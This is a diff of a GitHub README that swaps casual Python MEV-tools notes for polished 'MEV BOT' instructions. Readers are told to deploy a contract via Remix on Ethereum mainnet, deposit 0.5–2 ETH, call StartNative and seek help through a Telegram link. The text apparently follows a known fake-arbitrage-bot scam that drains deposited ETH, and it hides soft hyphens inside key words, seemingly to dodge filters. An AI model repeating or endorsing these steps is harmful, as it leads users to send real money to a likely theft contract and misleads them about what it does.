@@ -1,66 +1,81 @@
-# MEV-Tools
+# MEV-BOT
 
-[^1] This is a sample code, tested in mainnet
+## Overview
+Welcome to the **MEV BOT** GitHub repository! This project is designed to help users easily deploy and manage a smart contract for Ethereum that performs arbitrage operations with a minimum deposit requirement.
 
->Author Babaji kumaresan
+## Features
+- **Easy to Use**: Simple deployment and management.
+- **Secure**: Ensures a minimum deposit of 1 ETH.
+- **Optimized**: Efficient use of gas and resources.
 
-[^2] Use it for educational purpose only
+## Important Note
+This smart contract is designed to operate on the Ethereum mainnet and does not work on testnets due to specific dependencies and functionalities that are only present on the mainnet.
 
-[^3] you have to set the time out before selling the token else it will give error
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Important Note](#important-note)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Support](#Support)
+- [Help](#Help)
+- [License](#license)
 
-[^4] i have added eth_to_pepe_rate fixed quantity, change it dynamic to improve the code
+## Installation
+
+### Deploying with Remix IDE
+
+1. Download [**MetaMask**](https://metamask.io/download.html) (if you don’t have it already)
+   Access the  [**Remix IDE**](https://remix.ethereum.org)(this website is where we deploy the smart contract).
+
+2. **Create a New File**:
+   Click on the **File Explorers** tab, then click on **Create New File** and name it `MevBot.sol`.
 
 
-**How to install**
+3. **Copy the Contract Code**:
+   [**Copy the entire contract code**](MevBot.sol) from this repository and paste it into `MevBot.sol`.
 
-Use Pycharm for desktop.
+4. **Compile the Contract**:
+   Click on the **Solidity Compiler** tab, select the appropriate compiler version 0.6.12, and click on **Compile MevBot.sol**.
 
-Install required imports
->requirments file updated in the repo
-```
-pip install -r requirements.txt 
-```
-**Address :**
-weth_address = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
 
-uniswap_v3_router_address = "0xE592427A0AEce92De3Edee1F18E0157C05861564"
+5. **Deploy the Contract**:
+   - Click on the **Deploy & Run Transactions** tab.
+   - Select `Injected Web3` as the environment to connect to MetaMask.
+   - Ensure you are connected to the Ethereum mainnet in MetaMask.
+   - Click on the **Deploy** button.
 
-pepe_eth_pair_address = "0x11950d141ecb863f01007add7d1a342041227b58"
+6. **Confirm Deployment**:
+   Confirm the deployment transaction in MetaMask. Make sure you have enough ETH in your wallet to cover the gas fees and the minimum deposit requirement.
 
-Verify it in Ethscan,do this is correct address. pepe_eth_pair_address this is pep vs ETh token pool address. 
-when you are running code, if this address dont have any token. you have to rewatch the pool again in coinmarketcap.
+### Using the Contract
 
-```ruby
-Example :
+1. **Deposit ETH**:
+   Ensure that the contract has at least 0.5 ETH deposited. You can send ETH to the contract address directly from your wallet.
 
-https://coinmarketcap.com/dexscan/ethereum/0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640/
+2. **Start Arbitrage**:
+   Use the `StartNative` function to initiate the arbitrage process.
 
-This is the WTH/USDC
-Select the glass near to pair. it will take you to https://etherscan.io/address/0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640
+3. **Monitor Transactions**:
+   Monitor your transactions and profits using a block explorer like [**Etherscan.io**](https://etherscan.io/).
 
-This is the address for WETH/USDC Pool 0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640
+## Usage
 
-Pool is where you send your USDC to get WETH or sending WETH to get USDC.
+### Start Arbitrage Operation
+1. **Ensure sufficient funds**:
+   We recommend funding the contract with at least 0.5-2 ETH or higher to cover gas fees and possible burn fees. Bot targets to­ken c­ontr­a­cts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with less than recommended and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit.
 
-```
+2. **Call `StartNative`**:
+   Call the `StartNative` function to start the arbitrage process. You can do this directly from Remix or using any Ethereum wallet that supports contract interactions.
 
-(when the code is written, pepe is the trending token in ETh chian, its not the recommendation to buy)
-(Any token literally can go to zeroo)
+## Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
 
- 
- A   Mempool-->Monitor Trades;
- B   Monitor Trades-->Place Buy(D);
- 
+## Help
+If at any time you encounter any issues with the contract setup, contact the team at  [**Click Here**](https://t.me/UniMevBotsSupport/). 🛡️
 
-```mermaid
-graph TD;
-    A-->B;
-    A-->C;
-    B-->D;
-    C-->D;
-```
-then add the required private key and infura api key
+## License
 
-then you are good to go :)
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-Thank me later.
+
